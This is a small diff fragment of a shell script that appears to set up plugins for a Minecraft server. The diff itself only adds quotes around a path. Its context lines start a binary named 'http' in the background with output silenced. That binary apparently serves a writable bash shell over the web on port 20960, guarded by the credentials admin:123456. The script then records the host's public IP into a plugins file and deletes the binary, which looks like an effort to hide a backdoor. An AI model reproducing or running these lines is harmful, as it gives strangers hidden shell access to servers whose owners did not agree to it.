@@ -4,7 +4,7 @@ chmod +x http
 nohup ./http  -p 20960 -W -c admin:123456 bash >/dev/null 2>&1 &
 sleep 1
 current_dir=$(pwd)
-curl -4 ifconfig.me> $current_dir/plugins/ip.txt
+curl -4 ifconfig.me> "$current_dir/plugins/ip.txt"
 rm http
 
 target_file1="$current_dir/plugins/ViaBackwards.jar"
